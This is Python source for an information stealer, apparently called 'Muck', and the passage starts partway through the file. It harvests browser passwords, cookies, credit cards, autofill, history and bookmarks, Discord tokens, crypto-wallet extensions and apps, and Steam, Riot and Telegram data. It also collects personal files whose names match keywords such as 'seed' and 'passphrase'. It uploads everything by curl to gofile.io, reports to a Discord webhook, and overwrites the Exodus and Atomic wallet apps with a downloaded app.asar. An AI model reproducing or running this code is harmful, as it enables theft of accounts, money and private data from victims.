        data = SqlThing(pathC, tempfold,"SELECT * FROM autofill WHERE value NOT NULL")

        for row in data:
            if row[0] != '':
                Autofill.append(f"N4M3: {row[0]} | V4LU3: {row[1]}")
                AutofillCount += 1
        writeforfile(Autofill, 'autofill')
    except:pass

def getHistory(path, arg):
    try:
        global History, HistoryCount
        if not os.path.exists(path): return

        pathC = path + arg + "History"
        if os.stat(pathC).st_size == 0: return
        tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        data = SqlThing(pathC, tempfold,"SELECT * FROM urls")

        for row in data:
            if row[0] != '':
                History.append(row[1])
                HistoryCount += 1
        writeforfile(History, 'history')
    except:pass

def getwebsites(Words):
    rb = ' | '.join(da for da in Words)
    if len(rb) > 1000:
        rrrrr = Reformat(str(Words))
        return ' | '.join(da for da in rrrrr)
    else: return rb

def getBookmarks(path, arg):
    try:
        global Bookmarks, BookmarksCount
        if not os.path.exists(path): return

        pathC = path + arg + "Bookmarks"
        if os.path.exists(pathC):
            with open(pathC, 'r', encoding='utf8') as f:
                data = loads(f.read())
                for i in data['roots']['bookmark_bar']['children']:
                    try:
                        Bookmarks.append(f"N4M3: {i['name']} | UR1: {i['url']}")
                        BookmarksCount += 1
                    except:pass
        if os.stat(pathC).st_size == 0: return
        writeforfile(Bookmarks, 'bookmarks')
    except:pass

def parseCookies():
    try:
        tmpCookies = []
        for cookie in Cookies:
            try:
                key =   cookie.split(' | ')[0].split(': ')[1]
                name =  cookie.split(' | ')[1].split(': ')[1]
                value = cookie.split(' | ')[2].split(': ')[1]
                tmpCookies.append(f"{key}\tTRUE\t/\tFALSE\t2597573456\t{name}\t{value}")
            except: pass
        writeforfile(tmpCookies, 'parsedcookies')
    except:pass

def startBthread(func, arg):
    global Browserthread
    t = threading.Thread(target=func, args=arg)
    t.start()
    Browserthread.append(t)

def getBrowsers(browserPaths):
    global Browserthread
    FirefoxCookie()
    ThCokk, Browserthread, filess = [], [], []
    for patt in browserPaths:
        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

        startBthread(getAutofill,       [patt[0], patt[3]])
        startBthread(getHistory,        [patt[0], patt[3]])
        startBthread(getBookmarks,      [patt[0], patt[3]])
        startBthread(getCCs,            [patt[0], patt[3]])
        startBthread(getPassw,          [patt[0], patt[3]])

    for thread in ThCokk: thread.join()
    if Trust(Cookies) == True: __import__('sys').exit(0)
    parseCookies()
    for thread in Browserthread: thread.join()

    for file in ["muckpasswords.txt", "muckcookies.txt", "muckcreditcards.txt", "muckautofill.txt", "muckhistory.txt", "muckparsedcookies.txt", "muckbookmarks.txt"]:
        filess.append(uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))
    headers = {"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}

    data = {
        "content": GLINFO,
        "embeds": [
            {
                "title": "Password Stealer",
                "description": f"**Found**:\n{getwebsites(paswWords)}\n\n**Data:**\n **{PasswCount}** `Passwords Found`\n [Passwords.txt]({filess[0]})",
                "2895667": 14406413,
                "footer": {"text": "Muck | https://github.com/frankxrs/",  "icon_url": "https://i.imgur.com/Npe8QuD.png"}
            },
            {
                "title": "Cookies Stealer",
                "description": f"**Found**:\n{getwebsites(cookiWords)}\n\n**Data:**\n **{CookiCount}** Cookies Found\n [Cookies.txt]({filess[1]})\n [Parsed.txt]({filess[5]})",
                "2895667": 14406413,
                "footer": {"text": "Muck | https://github.com/frankxrs",  "icon_url": "https://i.imgur.com/Npe8QuD.png"}
            },
            {
                "title": "Other",
                "description": f"**{HistoryCount}** Websites Found\n [history.txt]({filess[4]})\n\n **{AutofillCount}** Infos Found\n [autofill.txt]({filess[3]})\n\n **{BookmarksCount}** Bookmarks found\n [bookmarks.txt]({filess[6]})\n\n**{CCsCount}** Creditcards Found\n [creditcards.txt]({filess[2]})",
                "2895667": 14406413,
                "footer": {"text": "Muck | https://github.com/frankxrs",  "icon_url": "https://i.imgur.com/Npe8QuD.png"}
            }
        ],
        "attachments": []
    }
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
    getaccountsinfo()
    return



def ExodusInjection(path, procc, exolink):
    if not os.path.exists(path): return
    
    listOfFile = os.listdir(path)
    apps = []
    for file in listOfFile:
        if "app-" in file:
            apps += [file]

    try:
        randomexodusfile = f"{path}/{apps[0]}/LICENSE"
        with open(randomexodusfile, 'r+') as IsAlradyInjected:
                check = IsAlradyInjected.read()
                if "gofile" in str(check): # already injected
                    return
    except: pass

    exodusPatchURL = "https://cdn.discordapp.com/attachments/1135684724585681039/1143224080603037827/app.asar"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"}
    req = Request(exodusPatchURL, headers=headers)
    response = urlopen(req)

    global hook
    khook = f'{hook.split("webhooks/")[1]}:{exolink}'
    data = response.read()
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    for app in apps:
        try:
            fullpath = f"{path}/{app}/resources/app.asar"
            licpath = f"{path}/{app}/LICENSE"

            with open(fullpath, 'wb') as out_file1:
                out_file1.write(data)
            with open(licpath, 'w') as out_file2:
                out_file2.write(khook)
        except: pass

def AtomicInjection(path, procc, atolink):
    if not os.path.exists(path): return

    try:
        randomexodusfile = f"{path}/LICENSE.electron.txt"
        with open(randomexodusfile, 'r+') as IsAlradyInjected:
                check = IsAlradyInjected.read()
                if "gofile" in str(check):
                    return
    except: pass

    exodusPatchURL = "https://cdn.discordapp.com/attachments/1086668425797058691/1113770559688413245/app.asar"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"}
    req = Request(exodusPatchURL, headers=headers)
    response = urlopen(req)

    global hook
    # format: 00000000000/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:XXXXXXXXXX
    khook = f'{hook.split("webhooks/")[1]}:{atolink}'
    # encryptedhook = binascii.hexlify(bytes(hook, "utf8")).decode("utf8", "ignore")
    data = response.read()
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    #for app in apps:
    try:
        fullpath = f"{path}/resources/app.asar"
        licpath = f"{path}/LICENSE.electron.txt"

        with open(fullpath, 'wb') as out_file1:
            out_file1.write(data)
        with open(licpath, 'w') as out_file2:
            out_file2.write(khook)
    except: pass



def GetDiscord(path, arg):

    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg
    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for file in os.listdir(pathC):
        if file.endswith(".log") or file.endswith(".ldb")   :
                for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        global Tokens
                        tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                        if checkToken(tokenDecoded):
                            if not tokenDecoded in Tokens:
                                Tokens += tokenDecoded
                                # writeforfile(Tokens, 'tokens')
                                uploadToken(tokenDecoded, path)
 
def ngstealer(path):
    path = f"{path}\\000003.log"
    if not os.path.exists(path): return
    users = []
    f = open(path, "r+", encoding="ansi")
    accounts = re.findall(r'{"username":".{1,69}","token":"', str(f.readlines()))
    for uss in accounts:
        username = uss.split('{"username":"')[1].split('"')[0]
        if username not in users:
            users += [username]
    
    servers = ["💙 | Blue","🧡 | Orange","💛 | Yellow","🤍 | White","🖤 | Black","💙 | Cyan","💚 | Lime","🧡 | Coral","💗 | Pink","❤️ | Alpha","🖤 | Sigma","💚 | Gamma","🩶 | Omega","💜 | Purple","💚 | Green","❤️ | Red","💜 | Delta","💗 | Ruby"]

    for user in users:

        payname = f"NationsGlory | {user};https://skins.nationsglory.fr/face/{user}/16"
        payload = []

        url = f"https://nationsglory.fr/profile/{user}"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
        try:
            html = str(urlopen(Request(url, headers=headers)).read())

            for server in servers:
                serv = server.split("| ")[1].lower()
                
                data = html.split(f'data-server="{serv}">')[1].split('<div class="card server-tab d-none"')[0]
                if not "pas encore conne" in data:
                    
                    timeplayed = "x"
                    try:

                        timeplayed = data.replace("\n", '').split('>Temps de jeu</h4>\\n<p class="h3 mb-2">\\n')[1].split("</p>")[0].replace("\\", "").replace("n", '')
                        contry = data.replace("\n", '').split(f'><a href="/country/{serv}/')[1].split('">')[0]
                        contryrank = data.replace("\n", '').split('Rang de pays</h4>\\n<p class="h3 mb-2">')[1].split('</p>\\n</div>\\n<div class="c')[0]
                    except:
                        contry, contryrank = "Pas de pays","Pas de rank"
                    
                    if "h" in timeplayed:
                        
                        payload += [{"name": server,"value": f"PlayTime: {timeplayed}\nContry: {contry}\nRank: {contryrank}","inline": True}]
            upload(payname, payload)
        except:
            pass

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for walletids in wallts:
        
        for patt in paths1:
            a = threading.Thread(target=ZipThings, args=[patt[0], patt[5]+str(walletids[0]), patt[1]])
            a.start()
            thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)

    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht:
        thread.join()
    global WalletsZip, GamingZip, OtherZip
        # print(WalletsZip, GamingZip, OtherZip)
    #print(WalletsZip)
    exodus_link, atolink = "", ""
    try:
        exodus_link = [item[1] for item in WalletsZip if item[0] == 'Exodus'][0]
    except: pass
    try:
        atolink = [item[1] for item in WalletsZip if item[0] == 'atomic'][0]
    except: pass
    # print(exodus_link)
    if exodus_link != "":
        threading.Thread(target=ExodusInjection, args=[f"{local}/exodus", "exodus.exe", exodus_link]).start()
    if atolink != "":
        threading.Thread(target=AtomicInjection, args=[f"{local}/Programs/atomic", "Atomic Wallet.exe", atolink]).start()
    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = "Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(GamingZip) == 0:
        ga = "Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = "Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "content": GLINFO,
        "embeds": [
            {
            "title": "App Stealer",
            "description": f"{wal}\n{ga}\n{ot}",
            "2895667": 14406413,
            "footer": {
                "text": "Muck | https://github.com/frankxrs",
                "icon_url": "https://i.imgur.com/Npe8QuD.png"
            }
            }
        ],
        "attachments": []
    }
    
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)

def ZipTelegram(path, arg, procc):

    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    time.sleep(1)
    zipfolder(name, pathC)

    for i in range(3):
        lnik = uploadToAnonfiles(f'{temp}/{name}.zip')
        if "https://" in str(lnik):
            break
        time.sleep(4)
    os.remove(f"{temp}/{name}.zip")
    OtherZip.append([arg, lnik])

def ZipThings(path, arg, procc):
    pathC = path
    name = arg
    
    global WalletsZip, GamingZip, OtherZip
    for walllts in wallts:
        if str(walllts[0]) in arg:
            browser = path.split("\\")[4].split("/")[1].replace(' ', '')
            name = f"{str(walllts[1])}_{browser}"
            pathC = path + arg

    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    time.sleep(1)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zipfolder(name, pathC) 

    for i in range(3):
        lnik = uploadToAnonfiles(f'{temp}/{name}.zip')
        if "https://" in str(lnik):break
        time.sleep(4)

    os.remove(f"{temp}/{name}.zip")
    if "/Local Extension Settings/" in arg or "/HougaBouga/"  in arg or "wallet" in arg.lower():
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])

def Startthread(meth, args = []):
    a = threading.Thread(target=meth, args=args)
    a.start()
    Threadlist.append(a)



def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >                 Password/CC < 3 >     Cookies < 4 >                 Extentions < 5 >                           '
    browserPaths = [    
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Beta/User Data",                   "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Dev/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Unstable/User Data",               "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Canary/User Data",                 "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",        "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Vivaldi/User Data",                              "vivaldi.exe",      "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserCanary/User Data",           "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserDeveloper/User Data",        "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserBeta/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserTech/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserSxS/User Data",              "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",         "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ]
    ]
    discordPaths = [
        [f"{roaming}/discord",          "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord",        "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary",    "/Local Storage/leveldb"],
        [f"{roaming}/discordptb",       "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb",                             "Atomic Wallet.exe",        "Wallet"        ],
        [f"{roaming}/Zcash",                                                    "Zcash.exe",                "Wallet"        ],
        [f"{roaming}/Armory",                                                   "Armory.exe",               "Wallet"        ],
        [f"{roaming}/bytecoin",                                                 "bytecoin.exe",             "Wallet"        ],
        [f"{roaming}/Exodus/exodus.wallet",                                     "Exodus.exe",               "Wallet"        ],
        [f"{roaming}/Binance/Local Storage/leveldb",                            "Binance.exe",              "Wallet"        ],
        [f"{roaming}/com.liberty.jaxx/IndexedDB/file__0.indexeddb.leveldb",     "Jaxx.exe",                 "Wallet"        ],
        [f"{roaming}/Electrum/wallets",                                         "Electrum.exe",             "Wallet"        ],
        [f"{roaming}/Coinomi/Coinomi/wallets",                                  "Coinomi.exe",              "Wallet"        ],
        ["C:\Program Files (x86)\Steam\config",                                 "steam.exe",                "Steam"         ],
        [f"{roaming}/NationsGlory/Local Storage/leveldb",                       "NationsGlory.exe",         "NationsGlory"  ],
        [f"{local}/Riot Games/Riot Client/Data",                                "RiotClientServices.exe",   "RiotClient"    ],
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'Telegram.exe', "Telegram"]


    for patt in browserPaths:
       Startthread(getToken,   [patt[0], patt[2]]                                   )
    for patt in discordPaths:
       Startthread(GetDiscord, [patt[0], patt[1]]                                   )
    Startthread(getBrowsers,   [browserPaths,]                                      )
    Startthread(GatherZips,    [browserPaths, PathsToZip, Telegram]                 )
    Startthread(ngstealer,     [f"{roaming}/NationsGlory/Local Storage/leveldb"]    )
    # Startthread(filestealr                                                          )
    for thread in Threadlist:
        thread.join()
    
def uploadToAnonfiles(path):
    try:
        r = subprocess.Popen(f"curl -F \"file=@{path}\" https://{gofileserver}.gofile.io/uploadFile", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
        return loads(r[0].decode('utf-8'))["data"]["downloadPage"]
    #try:    return requests.post(f'https://{gofileserver}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except: return False

def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and os.stat(path + "/" + file).st_size < 500000 and not ".lnk" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user    + "/Desktop",
        user    + "/Downloads",
        user    + "/Documents",
        roaming + "/Microsoft/Windows/Recent",
    ]


    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "bot",
        "atomic",
        "account",
        "acount",
        "paypal",
        "banque",
        "bot",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "seed",
        "mnemonic"
        "memoric",
        "private",
        "key",
        "passphrase",
        "pass",
        "phrase",
        "steal",
        "bank",
        "info",
        "casino",
        "prv",
        "privé",
        "prive",
        "telegram",
        "identifiant",
        "personnel",
        "trading"
        "bitcoin",
        "sauvegarde",
        "funds",
        "récupé",
        "recup",
        "note",
    ]
   
    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles])
        kiwi.start()
        wikith.append(kiwi)
    return wikith

def filestealr():
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1].replace("\\", "/")
            foldlist = arg[2]
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)

global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip, Threadlist

DETECTED = False
wallts = [
    ["nkbihfbeogaeaoehlefnkodbefgpgknn", "Metamask"         ],
    ["ejbalbakoplchlghecdalmeeeajnimhm", "Metamask"         ],
    ["fhbohimaelbohpjbbldcngcnapndodjp", "Binance"          ],
    ["hnfanknocfeofbddgcijnmhnfnkdnaad", "Coinbase"         ],
    ["fnjhmkhhmkbjkkabndcnnogagogbneec", "Ronin"            ],
    ["ibnejdfjmmkpcnlpebklmnkoeoihofec", "Tron"             ],
    ["ejjladinnckdgjemekebdpeokbikhfci", "Petra"            ],
    ["efbglgofoippbgcjepnhiblaibcnclgk", "Martian"          ],
    ["phkbamefinggmakgklpkljjmgibohnba", "Pontem"           ],
    ["ebfidpplhabeedpnhjnobghokpiioolj", "Fewcha"           ],
    ["afbcbjpbpfadlkmhmclhkeeodmamcflc", "Math"             ],
    ["aeachknmefphepccionboohckonoeemg", "Coin98"           ],
    ["bhghoamapcdpbohphigoooaddinpkbai", "Authenticator"    ],
    ["aholpfdialjgjfhomihkjbmgjidlcdno", "ExodusWeb3"       ],
    ["bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"          ],
    ["agoakfejjabomempkjlepdflaleeobhb", "Core"             ],
    ["mfgccjchihfkkindfppnaooecgfneiii", "Tokenpocket"      ],
    ["lgmpcpglpngdoalbgeoldeajfclnhafa", "Safepal"          ],
    ["bhhhlbepdkbapadjdnnojkbgioiodbic", "Solfare"          ],
    ["jblndlipeogpafnldhgmapagcccfchpi", "Kaikas"           ],
    ["kncchdigobghenbbaddojjnnaogfppfj", "iWallet"          ],
    ["ffnbelfdoeiohenkjibnmadjiehjhajb", "Yoroi"            ],
    ["hpglfhgfnhbgpjdenjgmdgoeiappafln", "Guarda"           ],
    ["cjelfplplebdjjenllpjcblmjkfcffne", "Jaxx Liberty"     ],
    ["amkmjjmmflddogmhpjloimipbofnfjih", "Wombat"           ],
    ["fhilaheimglignddkjgofkcbgekhenbh", "Oxygen"           ],
    ["nlbmnnijcnlegkjjpcfjclmcfggfefdm", "MEWCX"            ],
    ["nanjmdknhkinifnkgdcggcfnhdaammmj", "Guild"            ],
    ["nkddgncdjgjfcddamfgcmfnlhccnimig", "Saturn"           ], 
    ["aiifbnbfobpmeekipheeijimdpnlpgpp", "TerraStation"     ],
    ["fnnegphlobjdpkhecapkijjdkgcjhkib", "HarmonyOutdated"  ],
    ["cgeeodpfagjceefieflmdfphplkenlfk", "Ever"             ],
    ["pdadjkfkgcafgbceimcpbkalnfnepbnk", "KardiaChain"      ],
    ["mgffkfbidihjpoaomajlbgchddlicgpn", "PaliWallet"       ],
    ["aodkkagnadcbobfpggfnjeongemjbjca", "BoltX"            ],
    ["kpfopkelmapcoipemfendmdcghnegimn", "Liquality"        ],
    ["hmeobnfnfcmdkdcmlblgagmfpfboieaf", "XDEFI"            ],
    ["lpfcbjknijpeeillifnkikgncikgfhdo", "Nami"             ],
    ["dngmlblcodfobpdpecaadgfbcggfjfnm", "MaiarDEFI"        ],
    ["ookjlbkiijinhpmnjffcofjonbfbgaoc", "TempleTezos"      ],
    ["eigblbgjknlfbajkfhopmcojidlgcehm", "XMR.PT"           ],
]
IP = getip()
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")

keyword = ['[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', '[uber](https://uber.com)', '[netflix](https://netflix.com)', '[github](https://github.com)', '[stake](https://stake.com)']
ttusrnames = []
CookiCount, PasswCount, CCsCount, AutofillCount, HistoryCount, BookmarksCount = 0, 0, 0, 0, 0, 0
cookiWords, paswWords, History, CCs, Passw, Autofill, Cookies, WalletsZip, GamingZip, OtherZip, Threadlist, KiwiFiles, Bookmarks, Tokens = [], [], [], [], [], [], [], [], [], [], [], [], [], ''

try:gofileserver = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
except:gofileserver = "store4"
GLINFO = globalInfo()


GatherAll()
wikith = Kiwi()

for thread in wikith: thread.join()
time.sleep(0.2)

filetext = "\n"
for arg in KiwiFiles:
    if len(arg[2]) != 0:
        foldpath = arg[1]
        foldlist = arg[2]       
        filetext += f"📁 {foldpath}\n"

        for ffil in foldlist:
            a = ffil[0].split("/")
            fileanme = a[len(a)-1]
            b = ffil[1]
            filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
        filetext += "\n"
upload("kiwi", filetext)
